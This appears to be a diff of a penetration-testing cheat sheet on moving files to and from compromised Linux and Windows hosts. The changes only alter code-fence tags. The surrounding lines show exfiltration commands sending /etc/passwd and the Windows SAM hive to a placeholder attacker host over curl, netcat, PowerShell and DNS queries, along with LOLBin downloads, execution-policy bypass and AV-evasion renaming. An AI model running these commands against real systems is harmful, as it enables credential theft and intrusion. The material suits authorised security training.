@@ -7,7 +7,7 @@ Moving files between your attacker machine and a target is a core skill. The rig
 
 Before pulling anything to a target, you need to serve it. These are the fastest ways to spin up a file server on your attacker machine.
 
-```bash
+```bash wrap
 # Python HTTP (simplest, works everywhere)
 python3 -m http.server 8080
 
@@ -39,7 +39,7 @@ nc -lvnp 443 < file.exe          # attacker listens and streams the file out
 
 Standard download methods available on most Linux targets. `wget` and `curl` are almost always present; the others are fallbacks when standard tools are stripped.
 
-```bash
+```bash wrap
 # wget
 wget http://<ip>:8080/file -O /tmp/file
 
@@ -71,7 +71,7 @@ nc <ip> 443 > /tmp/file
 
 Methods to push files from a compromised Linux host back to your attacker machine for exfiltration or analysis.
 
-```bash
+```bash wrap
 # curl POST multipart upload (attacker needs uploadserver or a handler)
 curl -X POST http://<ip>:8080/upload -F "file=@/etc/passwd"
 
@@ -91,7 +91,7 @@ cat /etc/passwd | nc <attacker_ip> 443
 
 PowerShell and built-in Windows binaries (LOLBins) cover most scenarios. Prefer PowerShell methods; fall back to certutil or bitsadmin when PowerShell is restricted.
 
-```powershell
+```powershell wrap
 # Invoke-WebRequest (PowerShell 3+)
 Invoke-WebRequest http://<ip>:8080/file.exe -OutFile C:\Windows\Temp\file.exe
 
@@ -113,7 +113,7 @@ Set-ExecutionPolicy Bypass -Scope Process -Force
 powershell -ep bypass -c "(New-Object Net.WebClient).DownloadFile('http://<ip>/file.exe','C:\Temp\file.exe')"
 ```
 
-```cmd
+```cmd wrap
 :: certutil (LOLBin, available on all modern Windows)
 certutil.exe -urlcache -split -f http://<ip>:8080/file.exe C:\Windows\Temp\file.exe
 
@@ -132,7 +132,7 @@ copy \\<attacker_ip>\share\file.exe C:\Windows\Temp\file.exe
 
 Methods to push files from a compromised Windows host back to the attacker for exfiltration.
 
-```powershell
+```powershell wrap
 # Base64-encode a file and POST it (no special server needed, just a listener)
 $bytes = [IO.File]::ReadAllBytes("C:\Windows\system32\sam")
 $b64 = [Convert]::ToBase64String($bytes)
@@ -142,7 +142,7 @@ Invoke-WebRequest -Uri http://<attacker_ip>:8080/ -Method POST -Body $b64
 copy C:\Windows\Temp\loot.txt \\<attacker_ip>\share\loot.txt
 ```
 
-```cmd
+```cmd wrap
 :: Netcat push (attacker: nc -lvnp 443 > received_file)
 .\nc.exe <attacker_ip> 443 < C:\Windows\Temp\file.exe
 ```
@@ -151,7 +151,7 @@ copy C:\Windows\Temp\loot.txt \\<attacker_ip>\share\loot.txt
 
 When no HTTP or SMB path exists, encode the file as base64 and paste it directly through the shell session. This works over any interactive shell, including RDP clipboard and reverse shells.
 
-```bash
+```bash wrap
 # Linux: encode a file to base64 (no line wrapping so you can paste in one shot)
 base64 -w 0 /path/to/file && echo
 
@@ -163,7 +163,7 @@ md5sum /path/to/original/file
 md5sum /tmp/file
 ```
 
-```powershell
+```powershell wrap
 # Windows: encode a file to base64
 [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Windows\Temp\file.exe"))
 
@@ -178,7 +178,7 @@ Get-FileHash C:\Windows\Temp\file.exe -Algorithm MD5
 
 Use DNS only when every other channel is blocked. It is slow and generates unusual query volume, so use it as a last resort.
 
-```bash
+```bash wrap
 # dnscat2: full bidirectional tunnel over DNS (run server on attacker first)
 # Attacker:
 ruby dnscat2.rb --dns "domain=<your_domain>,host=0.0.0.0" --no-cache
@@ -190,7 +190,7 @@ ruby dnscat2.rb --dns "domain=<your_domain>,host=0.0.0.0" --no-cache
 .\dnscat2.ps1 -Domain <your_domain>
 ```
 
-```bash
+```bash wrap
 # Manual DNS exfil: chunk a file and send each chunk as a subdomain query (slow, noisy)
 # Each nslookup sends 16 bytes as a hex subdomain to your controlled domain
 for chunk in $(xxd -p -c 16 /etc/passwd); do
@@ -203,7 +203,7 @@ done
 
 Simple steps that make file transfers blend in or avoid leaving artifacts that AV and EDR flag.
 
-```bash
+```bash wrap
 # Rename extension before transfer; rename on target after download
 # Attacker: mv shell.exe shell.txt
 # Target: mv shell.txt shell.exe (or: copy shell.txt shell.exe)
